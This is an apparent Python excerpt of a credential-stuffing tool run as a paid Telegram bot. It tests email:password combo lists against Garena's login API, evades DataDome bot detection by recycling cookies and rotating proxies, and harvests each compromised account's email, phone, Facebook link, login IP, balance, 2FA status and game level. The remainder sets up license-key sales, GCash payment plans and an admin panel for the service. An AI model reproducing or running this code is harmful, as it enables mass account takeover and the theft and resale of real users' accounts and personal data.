            datadome_manager.clear_session_datadome(session)
            dd = datadome_manager.get_datadome()
            if dd:
                datadome_manager.set_session_datadome(session, dd)
            else:
                saved = cookie_manager.get_valid_cookies()
                if saved:
                    picked = random.choice(saved)
                    val = picked.split('=', 1)[1] if '=' in picked else picked
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    ndd = get_datadome_cookie(session, proxies=proxy_dict)
                    if ndd:
                        datadome_manager.set_datadome(ndd)
                        datadome_manager.set_session_datadome(session, ndd)
            v1, v2, new_dd = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager, stop_event=stop_event)
            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session, stop_event=stop_event):
                    session.close()
                    session = requests.Session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return 'IP_CHANGED'
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            if not v1 or not v2:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                _display(account, password, None, None, False, err="Account Doesn't Exist!")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            if new_dd:
                datadome_manager.set_datadome(new_dd)
                datadome_manager.set_session_datadome(session, new_dd)
            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err=reason)
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                return 'ERROR'
            cookie_parts = [f'{k}={session.cookies.get(k)}' for k in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'] if session.cookies.get(k)]
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if datadome_manager.handle_403(session, stop_event=stop_event):
                    if attempt < max_retries:
                        if not suppress_print:
                            print(f'  {_YL}⚠  403 error, retrying ({attempt}/{max_retries}){_RST}')
                        continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {_YL}⚠  Invalid response, retrying ({attempt}/{max_retries}){_RST}')
                    time.sleep(2)
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            if 'error_auth' in account_data_json:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    live_stats.update_stats(valid=False)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err="Account Doesn't Exist!")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
                else:
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    live_stats.update_stats(is_error=True)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            codm_session = requests.Session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
            has_codm, codm_info = check_codm_account(codm_session, account)
            codm_session.close()
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    if not suppress_print:
                        console.print(f'  [dim]🔄 Checking game connections for {account}...[/dim]')
                    game_connections = get_game_connections(session, account)
                    if game_connections:
                        if not suppress_print:
                            console.print(f'  [dim]✓ Found {len(game_connections)} game connection(s)[/dim]')
                            for g in game_connections:
                                console.print(f'  [dim]  • {g.get("game")}: {g.get("role")} ({g.get("region")})[/dim]')
                    else:
                        if not suppress_print:
                            console.print(f'  [dim]✗ No game connections found[/dim]')
                except Exception as _ge:
                    if not suppress_print:
                        console.print(f'  [yellow]⚠ Game check error: {_ge}[/yellow]')
                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
            else:
                email_display = 'N/A'
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            shell_balance = details['profile'].get('shell_balance', 0)
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': shell_balance,
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'game_connections': game_connections,
                'two_step_verify': details['security'].get('two_step_verify', False),
                'authenticator_app': details['security'].get('authenticator_app', False)
            }
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            results_manager.add_account(account_data)
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(
                valid=True,
                clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                game_connections=game_connections,
                shell=shell_balance
            )
            live_stats.push_result(
                success=True,
                is_clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                shell_balance=shell_balance
            )
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            _display(account, password, details, codm_info, has_codm, gc=game_connections)
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
            return 'DONE'
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < max_retries:
                if not suppress_print:
                    print(f'  {_YL}⚠  Connection/Timeout error, retrying ({attempt}/{max_retries}){_RST}')
                time.sleep(3)
                continue
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR'
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            logger.error(f'[ERROR] Unexpected error processing {account}: {e}')
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR'

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    for attempt in range(max_retries):
        try:
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'datadome', 'sso_key']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_parts:
                headers['cookie'] = '; '.join(cookie_parts)
            resp = session.get(url, headers=headers, params=params, timeout=10)
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                session.cookies.set('datadome', new_dd, domain='.garena.com')
                datadome_manager.set_datadome(new_dd)
            if resp.status_code == 403:
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    time.sleep(0.3)
                    continue
                else:
                    return (None, None, None)
            if resp.status_code != 200:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                continue
            resp.raise_for_status()
            try:
                data = resp.json()
            except json.JSONDecodeError:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                continue
            if 'error' in data:
                return (None, None, None)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                continue
            return (v1, v2, new_dd)
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
    return (None, None, None)

def _parse_proxy_line(raw: str) -> str | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return raw
        return None
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
    return None

# ── geo_rotator (global proxy rotator) ─────────────────────────────
class GeoRotator:
    def __init__(self):
        self._proxy_files = []
        self._file_idx = 0
        self.total = 0
        self.current_proxy = None
        self._lock = threading.Lock()

        # Load from proxy/ folder
        proxy_dir = Path('proxy')
        if proxy_dir.exists():
            self._proxy_files = sorted(proxy_dir.glob('*.txt'))
        if not self._proxy_files:
            # fallback to root proxies.txt
            if Path('proxies.txt').exists():
                self._proxy_files = [Path('proxies.txt')]

    def get_proxies(self):
        with self._lock:
            if not self._proxy_files:
                return {}
            pf = self._proxy_files[self._file_idx % len(self._proxy_files)]
            proxies = []
            try:
                with open(pf, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        url = _parse_proxy_line(line)
                        if url:
                            proxies.append(url)
                if proxies:
                    self.total = len(proxies)
                    self.current_proxy = random.choice(proxies)
                    return {'http': self.current_proxy, 'https': self.current_proxy}
            except:
                pass
            return {}

    def force_rotate(self):
        with self._lock:
            self._file_idx += 1
            if self._file_idx >= len(self._proxy_files):
                self._file_idx = 0
            return self.get_proxies()

geo_rotator = GeoRotator()

# ── remove_duplicates_from_file (used by bot) ─────────────────────
def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        unique = list(dict.fromkeys(lines))
        if len(unique) != len(lines):
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(unique))
        return len(lines) - len(unique)
    except:
        return 0

# ── create_thread_session (used by run_checker) ──────────────────
def create_thread_session(cookie_manager, datadome_manager):
    s = requests.Session()
    cookies = cookie_manager.get_valid_cookies()
    if cookies:
        applyck(s, '; '.join(cookies))
        for part in cookies[-1].split(';'):
            part = part.strip()
            if part.startswith('datadome='):
                datadome_manager.set_datadome(part.split('=', 1)[1].strip())
                break
    else:
        dd = get_datadome_cookie(s)
        if dd:
            datadome_manager.set_datadome(dd)
            s.cookies.set('datadome', dd, domain='.garena.com')
    # also set proxy if any
    proxy = geo_rotator.get_proxies()
    if proxy:
        s.proxies.update(proxy)
    return s

CHECKER_OK = True
CHECKER_ERR = ""

LEVEL_OPTIONS = {
    "lvl_all": {"label":" ALL Levels","threshold":[0]},
    "lvl_100": {"label":" Level 100+","threshold":[100]},
    "lvl_200": {"label":" Level 200+","threshold":[200]},
    "lvl_300": {"label":" Level 300+","threshold":[300]},
    "lvl_400": {"label":" Level 400+","threshold":[400]},
}
CLEAN_OPTIONS = {
    "cf_both":     {"label":" All hits","filter":"both"},
    "cf_clean":    {"label":" Clean only","filter":"clean"},
    "cf_notclean": {"label":" Not-clean only","filter":"notclean"},
}

MAX_CONCURRENT_CHECKERS = 2    # 512MB Railway: max 2 concurrent checkers safely
_checker_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKERS)
_semaphore_lock    = threading.Lock()
_checker_queue: List[str] = []
_queue_lock = threading.Lock()

def rebuild_semaphore(n: int):
    global _checker_semaphore, MAX_CONCURRENT_CHECKERS
    with _semaphore_lock:
        MAX_CONCURRENT_CHECKERS = n
        _checker_semaphore = threading.Semaphore(n)

def _enqueue(uid):
    with _queue_lock:
        if uid not in _checker_queue: _checker_queue.append(uid)

def _dequeue(uid):
    with _queue_lock:
        try: _checker_queue.remove(uid)
        except: pass

def _queue_pos(uid) -> int:
    with _queue_lock:
        try: return _checker_queue.index(uid)+1
        except: return 0

# ════════════════════════════════════════════
#  SESSION + MESSAGE TRACKER
# ════════════════════════════════════════════
active_sessions: Dict[str,dict] = {}
_admin_stopped: set = set()   # uids force-stopped by admin — can be continued
sessions_lock = threading.Lock()
bot_messages:  Dict[str,list]  = {}
bot_msg_lock  = threading.Lock()

def track(uid: str, mid: int):
    with bot_msg_lock: bot_messages.setdefault(uid,[]).append(mid)

# ════════════════════════════════════════════
#  USER HELPERS
# ════════════════════════════════════════════
def get_or_create_user(uid,username="",first_name=""):
    users = load_users()
    if uid not in users:
        users[uid] = {"username":username,"first_name":first_name,"banned":False,
                      "vip":False,"activated":False,"total_checked":0,"sessions_count":0,
                      "sessions_since_cd":0,"last_cd_at":None,"key_used":None,
                      "key_expires_at":None,"joined":datetime.now().isoformat(),
                      "last_seen":datetime.now().isoformat(),
                      "custom_limit":None,"note":"","total_hits":0,"hit_count":0}
    else:
        if username:   users[uid]["username"]   = username
        if first_name: users[uid]["first_name"] = first_name
        users[uid]["last_seen"] = datetime.now().isoformat()
        users[uid].setdefault("custom_limit", None)
        users[uid].setdefault("note", "")
        users[uid].setdefault("total_hits", 0)
        users[uid].setdefault("hit_count", 0)
    save_users(users)
    return users[uid], users

def is_admin(uid: int, cfg: dict) -> bool:
    return uid in cfg.get("admin_ids",[])

def check_key_expiry(uid: str) -> bool:
    users = load_users(); u = users.get(uid,{})
    if key_expired(u.get("key_expires_at")):
        users[uid]["activated"]=False; users[uid]["key_expired"]=True
        save_users(users); return True
    return False

def check_cooldown(uid: str, cfg: dict):
    cd_s = cfg.get("cooldown_sessions"); cd_m = cfg.get("cooldown_minutes",30)
    if not cd_s: return False,0.0
    users = load_users(); u = users.get(uid,{})
    if u.get("vip"): return False,0.0
    lcd = u.get("last_cd_at")
    if lcd:
        try:
            ldt = datetime.fromisoformat(lcd)
            if ldt.tzinfo is None: ldt=ldt.replace(tzinfo=timezone.utc)
            el = (datetime.now(timezone.utc)-ldt).total_seconds()/60
            if el >= cd_m:
                users[uid]["sessions_since_cd"]=0; users[uid]["last_cd_at"]=None
                save_users(users); return False,0.0
            return True,round(cd_m-el,1)
        except: pass
    if u.get("sessions_since_cd",0) >= cd_s:
        users[uid]["last_cd_at"]=datetime.now(timezone.utc).isoformat()
        users[uid]["sessions_since_cd"]=0; save_users(users)
        return True,float(cd_m)
    return False,0.0

def inc_session(uid: str):
    users=load_users()
    if uid in users:
        users[uid]["sessions_since_cd"]=users[uid].get("sessions_since_cd",0)+1
        save_users(users)

def del_combo(p):
    try:
        p = Path(p)
        if p.exists(): p.unlink()
        # Also delete the checkpoint file so resume starts fresh
        ckpt = Path(str(p) + ".ckpt")
        if ckpt.exists():
            try: ckpt.unlink()
            except: pass
        # Remove combo/{uid}/ folder if now empty
        parent = p.parent
        if parent.exists() and parent != COMBO_DIR and not any(parent.iterdir()):
            parent.rmdir()
    except Exception as e: log.warning(f"del_combo: {e}")

def del_result_folder(rf, base_dir=None):
    """Delete rf (a timestamped result folder) and clean up empty parent uid-folder.
    base_dir defaults to RESULTS_DIR — stops parent cleanup there."""
    import shutil as _sh
    base = base_dir or RESULTS_DIR
    try:
        rf = Path(rf)
        if rf.exists():
            _sh.rmtree(rf, ignore_errors=True)
            log.info(f" Deleted result folder: {rf}")
        # Remove results/{uid}/ if now empty
        parent = rf.parent
        if parent.exists() and parent != base and not any(parent.iterdir()):
            parent.rmdir()
            log.info(f" Deleted empty uid result folder: {parent}")
    except Exception as e:
        log.warning(f"del_result_folder: {e}")

# ════════════════════════════════════════════
#  CHANNEL GATE
# ════════════════════════════════════════════
async def in_channel(bot,uid,ch) -> bool:
    try:
        m = await bot.get_chat_member(f"@{ch}",uid)
        return m.status in (ChatMember.MEMBER,ChatMember.ADMINISTRATOR,ChatMember.OWNER)
    except: return False

async def join_prompt(target,ch):
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Join Channel",url=f"https://t.me/{ch}")],
                                [InlineKeyboardButton(" I Joined — Verify Now",callback_data="check_join")]])
    txt = (f" <b>Access Denied</b>\n\nJoin <b>@{ch}</b> first.\n\n"
           "1 Tap <b>Join Channel</b>\n2 Tap <b>I Joined — Verify Now</b>")
    if hasattr(target,"edit_message_text"): await target.edit_message_text(txt,reply_markup=kb,parse_mode=ParseMode.HTML)
    else: await target.reply_text(txt,reply_markup=kb,parse_mode=ParseMode.HTML)

async def gate(update,context,require_key=True):
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()
    if is_admin(tg.id,cfg):
        ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or ""); return True,ud,u
    ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or "")
    if ud.get("banned"):
        await update.effective_message.reply_text(" You are <b>banned</b>.",parse_mode=ParseMode.HTML); return False,None,u
    if require_key:
        if not ud.get("activated"):
            await update.effective_message.reply_text(" Use <code>/redeem YOUR_KEY</code>.",parse_mode=ParseMode.HTML); return False,None,u
        if check_key_expiry(uid):
            await update.effective_message.reply_text(" <b>Key Expired.</b> Contact admin.",parse_mode=ParseMode.HTML); return False,None,load_users()
    if cfg.get("locked") and not ud.get("vip"):
        await update.effective_message.reply_text(" <b>Bot Locked.</b>",parse_mode=ParseMode.HTML); return False,None,u
    return True,ud,u

async def gate_cb(query,context):
    tg=query.from_user; uid=str(tg.id); cfg=load_config()
    if is_admin(tg.id,cfg):
        ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or ""); return True,ud,u
    ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or "")
    if ud.get("banned"): await query.answer(" Banned!",show_alert=True); return False,None,u
    if not ud.get("activated") and not is_admin(tg.id,cfg):
        await query.answer(" Use /redeem KEY!",show_alert=True); return False,None,u
    if check_key_expiry(uid): await query.answer(" Key expired!",show_alert=True); return False,None,load_users()
    if load_config().get("locked") and not ud.get("vip"):
        await query.answer(" Bot locked!",show_alert=True); return False,None,u
    return True,ud,u

def admin_only(fn):
    @wraps(fn)
    async def w(update,context):
        if not is_admin(update.effective_user.id,load_config()):
            await update.message.reply_text(" Admin only."); return
        return await fn(update,context)
    return w

# ════════════════════════════════════════════
#  BUTTON TEXT CONSTANTS (used for routing)
# ════════════════════════════════════════════
BTN_CHECK     = "Check Accounts"
BTN_ADMIN     = "Admin Panel"
BTN_STOP      = "Stop Checking"
BTN_STATUS    = "My Status"
BTN_RESULTS   = "Get Results File"
BTN_HITS_ON   = "Enable Hit Notifs"
BTN_HITS_OFF  = "Disable Hit Notifs"
BTN_DELETE    = "Delete My File"

BTN_START_NOW = "START CHECKING NOW"
BTN_LVL_MENU  = "Change Level Filter"
BTN_CF_MENU   = "Change Clean Filter"

BTN_LVL_ALL   = "ALL Levels"
BTN_LVL_100   = "Level 100+"
BTN_LVL_200   = "Level 200+"
BTN_LVL_300   = "Level 300+"
BTN_LVL_400   = "Level 400+"

BTN_CF_BOTH   = "All Hits"
BTN_CF_CLEAN  = "Clean Only"
BTN_CF_DIRTY  = "Not-Clean Only"

BTN_CONTINUE  = "Continue Checking"
BTN_STOP_GET  = "Stop and Get Results"

BTN_BACK      = "Back"
BTN_CANCEL    = "Cancel"

BTN_BUY       = "🛒 Buy Key"
BTN_DEMO      = "🎮 Try Demo"

# Admin button texts
BTN_ADM_KEYS      = "Keys"
BTN_ADM_USERS     = "Users"
BTN_ADM_PROXY     = "Proxy"
BTN_ADM_SETTINGS  = "Settings"
BTN_ADM_FILES     = "Files"
BTN_ADM_STATS     = "Statistics"
BTN_ADM_LOCK      = "Lock Bot"
BTN_ADM_UNLOCK    = "Unlock Bot"
BTN_ADM_REFRESH   = "Refresh"
BTN_ADM_RUNNING   = "Running Sessions"
BTN_ADM_BACK      = "Admin Back"

BTN_ADM_GEN_HOURS  = "Generate Hours Key"
BTN_ADM_GEN_DAYS   = "Generate Days Key"
BTN_ADM_GEN_MONTHS = "Generate Months Key"
BTN_ADM_GEN_LIFE   = "Generate Lifetime Key"
BTN_ADM_RM_ALL_K   = "Remove All Keys"
BTN_ADM_RM_VIP_K   = "Remove VIP Keys"
BTN_ADM_RM_NVIP_K  = "Remove Non-VIP Keys"

BTN_ADM_ADDVIP    = "Add VIP"
BTN_ADM_RMVIP     = "Remove VIP"
BTN_ADM_BAN       = "Ban User"
BTN_ADM_UNBAN     = "Unban User"
BTN_ADM_ALLUSERS  = "All Users"
BTN_ADM_BROADCAST = "Broadcast Message"

BTN_ADM_UPL_PROXY  = "Upload Proxy File"
BTN_ADM_PROXY_STAT = "Proxy Status"
BTN_ADM_RM_PROXY   = "Remove Proxy Files"
BTN_ADM_PASTE_PRX  = "Paste Proxies"
BTN_ADM_RELOAD_PRX = "Reload Proxy"

BTN_ADM_SET_LIMIT  = "Set Line Limit"
BTN_ADM_SET_VLIMIT = "Set VIP Limit"
BTN_ADM_SET_CD     = "Set Cooldown"
BTN_ADM_SET_THR    = "Set Threads"
BTN_ADM_SET_CONC   = "Set Concurrent"
BTN_ADM_RELOAD_CFG = "Reload Config"

BTN_ADM_CLR_COMBO  = "Clear Combo Files"
BTN_ADM_CLR_RES    = "Clear Result Files"

# Admin Den button texts
BTN_ADM_DEN        = "⚡ Admin Den"
BTN_ADM_ANNOUNCE   = "📢 Announcement"
BTN_ADM_MAINT      = "🔧 Maintenance"
BTN_ADM_TOPUSERS   = "🏆 Top Users"
BTN_ADM_SYSINFO    = "🖥 System Info"
BTN_ADM_MLIMIT     = "📏 Max Lines/Check"
BTN_ADM_USERNOTE   = "📝 User Notes"
BTN_ADM_BATCHKEY   = "🔑 Batch Keys"
BTN_ADM_USERSEARCH = "🔍 Search User"
BTN_ADM_KEYLIST    = "📋 Key List"
BTN_ADM_NOTIFHIT   = "🔔 Hit Notifications"

# ─── ReplyKeyboard builders ───────────────────────────────────────────────────
def rkb(*rows, one_time=False, resize=True):
    """Build a ReplyKeyboardMarkup from row-lists of button label strings."""
    keyboard = [[KeyboardButton(t) for t in row] for row in rows]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=resize, one_time_keyboard=one_time)

def kb_main_user():
    return rkb(
        [BTN_CHECK],
        [BTN_STATUS, BTN_STOP],
        [BTN_RESULTS, BTN_DELETE],
        [BTN_HITS_ON, BTN_HITS_OFF],
        [BTN_BUY, BTN_DEMO],
    )

def kb_main_admin():
    return rkb(
        [BTN_CHECK],
        [BTN_STATUS, BTN_STOP],
        [BTN_RESULTS, BTN_DELETE],
        [BTN_ADMIN],
        [BTN_HITS_ON, BTN_HITS_OFF],
        [BTN_BUY],
    )

def kb_no_key():
    """Keyboard for users who have no key yet — Buy or Demo."""
    return rkb(
        [BTN_BUY],
        [BTN_DEMO],
    )

def kb_gcash_plans():
    """InlineKeyboard showing GCash plans."""
    rows = []
    for pk, pd in GCASH_PLANS.items():
        rows.append([InlineKeyboardButton(
            f"{'💎' if pk=='plan_life' else '🔑'} {pd['label']} — {pd['price']}",
            callback_data=f"gcash_sel:{pk}")])
    return InlineKeyboardMarkup(rows)

def kb_gcash_admin(buyer_uid, plan_key):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ APPROVE", callback_data=f"gcash_approve:{buyer_uid}:{plan_key}"),
        InlineKeyboardButton("❌ DENY",    callback_data=f"gcash_deny:{buyer_uid}:{plan_key}"),
    ]])

def kb_settings(uid):
    with sessions_lock: s = active_sessions.get(uid, {})
    lk = s.get("lvl_key", "lvl_all"); ck = s.get("cf_key", "cf_both")
    ll = LEVEL_OPTIONS[lk]["label"]; cl = CLEAN_OPTIONS[ck]["label"]
    return rkb(
        [BTN_START_NOW],
        [BTN_LVL_MENU],
        [BTN_CF_MENU],
        [BTN_CANCEL],
    )

def kb_level():
    return rkb(
        [BTN_LVL_ALL],
        [BTN_LVL_100, BTN_LVL_200],
        [BTN_LVL_300, BTN_LVL_400],
        [BTN_BACK],
    )

def kb_filter():
    return rkb(
        [BTN_CF_BOTH],
        [BTN_CF_CLEAN, BTN_CF_DIRTY],
        [BTN_BACK],
    )

def kb_stop_prompt():
    return rkb(
        [BTN_CONTINUE],
        [BTN_STOP_GET],
    )

def kb_join_channel(ch):
    """Channel gate still uses InlineKeyboard (URL button needs inline)."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Join Channel", url=f"https://t.me/{ch}")],
        [InlineKeyboardButton("I Joined — Verify Now", callback_data="check_join")],
    ])

def kb_admin_main(cfg):
    locked = cfg.get("locked", False)
    return rkb(
